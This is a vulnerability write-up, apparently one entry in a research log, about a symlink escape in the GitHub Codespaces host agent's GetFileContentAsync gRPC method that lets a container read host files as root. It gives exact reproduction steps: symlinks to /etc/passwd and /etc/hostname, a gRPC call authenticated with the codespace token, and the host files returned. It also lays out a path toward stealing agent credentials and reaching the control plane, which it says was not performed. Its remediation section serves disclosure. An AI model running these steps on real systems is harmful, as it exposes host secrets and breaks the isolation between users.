# Entry 110 — CVE: Host file read via symlink escape in Codespaces agent GetFileContentAsync

**Status: VERIFIED — proof-of-reach complete. Not extended to credential harvesting / control-plane access.**
**Category:** security-relevant finding in GitHub Codespaces host VM agent (`codespaces vmagent`, v1.1.4335.63700)
**Impact class:** arbitrary host file disclosure (read) from inside the codespace container, as root

---

## 1. Summary

The Codespaces host agent exposes an authenticated gRPC method
`Codespaces.Grpc.CodespaceHostService.V1.CodespaceHost/GetFileContentAsync` on
`cs-agent.sock` (bind-mounted into every codespace container). The method reads
a file **on the host**, joining a caller-supplied path onto the agent's working
directory and validating only the *lexical string prefix*. Because
`Path.GetFullPath` does not resolve symlinks, a symlink created inside the
workspace (a host bind-mount) that points to an arbitrary host path passes the
check, and the agent reads the target on the host as **root**. Net effect:
**arbitrary host file read from the container** — a pure local file-disclosure
primitive (analogous to HuggingFace July-2026 incident Vector 1).

---

## 2. Vulnerable sink (IL, recovered with monodis)

Assembly: `/.codespaces/bin/codespaces.dll` (bind-mounted read-only from host
`/.codespaces/agent/mount/`). Handler: `CodespaceHostServiceV1/GetFileContentAsync`.

```
fullPath = Path.GetFullPath(Path.Join(FilePathProvider.WorkingDirectory, request.Path));
if (!fullPath.StartsWith(FilePathProvider.WorkingDirectory))
    throw new RpcException(new Status(StatusCode.InvalidArgument,
        "Path is not within the working directory"));
using (var reader = new StreamReader(fullPath, Encoding.UTF8))
    content = reader.ReadToEnd();
return new GetFileContentResponse { Content = content };
```

- Request: `GetFileContentRequest`, **`Path` field number = 1** (`PathFieldNumber = 0x00000001`).
- `Path.GetFullPath` = purely lexical (normalizes `.`/`..`, **no symlink resolution**).
- `StartsWith` checks the string prefix of `fullPath`, not the resolved target.
- `StreamReader` follows the symlink **on the host** (the agent process is host-side root).
- Working directory = the codespace workspace on the host:
  `/var/lib/docker/codespacemount/workspace/agent-mothership` (bound into the container at `/workspaces/agent-mothership`).

---

## 3. Reproduction steps (exact)

### 3.1 Preconditions
- In-codespace, root in container (standard for GitHub Codespaces).
- Read the env token: `GITHUB_CODESPACE_TOKEN` (this **is** the bearer key for the socket).

### 3.2 Create a symlink inside the workspace pointing outside it (on the host)
```bash
cd /workspaces/agent-mothership
ln -sf /etc/hostname research/.hostname_link
ln -sf /etc/passwd  research/.passwd_link
```
The workspace is a bind mount, so these links exist on the host under
`/var/lib/docker/codespacemount/workspace/agent-mothership/research/`.

### 3.3 Call the RPC (Node h2c/gRPC over the unix socket)
```js
// connect: http2.connect('http://localhost', { createConnection: () => net.connect('/workspaces/.codespaces/shared/cs-agent.sock') })
// path:  /Codespaces.Grpc.CodespaceHostService.V1.CodespaceHost/GetFileContentAsync
// headers: content-type: application/grpc, te: trailers, authorization: Bearer <GITHUB_CODESPACE_TOKEN>
// body: protobuf  field 1 (Path) = "research/.hostname_link"   -> 0A 0F 72 65 73 65 61 72 63 68 2F 2E 68 6F 73 74 6E 61 6D 65 5F 6C 69 6E 6B
//        protobuf  field 1 (Path) = "research/.passwd_link"
```

### 3.4 Observed result (grpc-status 0, content returned)
| Request Path | Returned content | Proves |
|---|---|---|
| `package.json` | repo package.json | normal workspace read works |
| `research/.hostname_link` | `03e6268f-d0a4-4807-b05f-c4d41203c14e` | **HOST VM hostname** (Azure VM GUID), not container `codespaces-00c504` |
| `research/.passwd_link` | host `/etc/passwd` (root→`/bin/bash`, full host users) | **HOST passwd**, not the devcontainer's |

### 3.5 Cleanup
```bash
rm -f /workspaces/agent-mothership/research/.hostname_link /workspaces/agent-mothership/research/.passwd_link
```

---

## 4. Why the check fails (the bug, in one paragraph)

The boundary control validates the *string* `Path.GetFullPath(join(workdir, path))`
starts with `workdir`. It never validates the *filesystem target* the read will
actually hit. A symlink satisfies the string check while redirecting the read to
`/`-absolute paths on the host. The check is "does the requested string look like
it's under the workspace", not "does the resolved object live under the workspace".

---

## 5. Feasibility assessment — walking into the control plane (analysis only, not performed)

Honest odds, given the primitive and the platform's design:

| Step | Action | Odds | Basis |
|---|---|---|---|
| 0 | Host file read via symlink escape | **100% (done, verified)** | §3.4 |
| 1 | Read agent credential store (`credentialsPath` on host, e.g. `/root/.codespaces/agent/...`) | ~85% | same read primitive; agent is host-root; path from DLL strings (`credentialsPath`, `AddCredentialsToSecretManager`, `GetAuthorizationHeader`) |
| 2 | Credential is directly usable (JWT / refreshable) rather than KMS/protected | ~50% | .NET agent could store via secret manager / Key Vault; unknown until read |
| 3 | Agent identity is accepted by `online.visualstudio.com/api/v1/` from a non-agent context | ~70% | it's the same bearer the agent uses |
| 4 | **That identity grants cross-environment access** (other users' codespaces / global control plane) | **~10-20%** | VSCS agent identities are almost certainly scoped per-VM (`sr=c`-style SAS scoping seen in §Entry 109); cross-tenant reach is the exception, not the design |

**Combined realistic odds of actually reaching other users' environments: ~5-10%.**
The host-read primitive is the payout and is fully proven; "walking into the
control panel" additionally requires (a) a usable credential, and (b) the
platform's agent identities to be *unscoped* — a design failure that is unlikely.
The part that would make this real (steps 1-4, actually touching the control
plane) is **unauthorized access to systems the environment owner does not own**
and is deliberately **not performed**.

---

## 6. Remediation guidance (for disclosure)

1. Resolve symlinks (e.g. `File.ResolveLinkTarget`/`realpath`) and validate the **resolved** target still starts with the workspace.
2. Or read via `FileStream` with `FileShare` and no link-following; reject any component that is a symlink.
3. Scope the read by opening the file through a jailed path (`openat2` with `RESOLVE_BENEATH`/`RESOLVE_NO_SYMLINKS`) rather than string checks.
4. Do not run the agent's file API as host root; drop to the workspace owner UID.

## 7. Repo artifacts
- `research/entries/110-host-file-read.md` (this file)
- `research/entries/109-platform-boundary.md` (channel map: cs-agent.sock, bearer key, gRPC surface, frozen-logs observation)
- `/tmp/codespaces.il` (full IL disassembly of `codespaces.dll`; schema + sink recovered from it)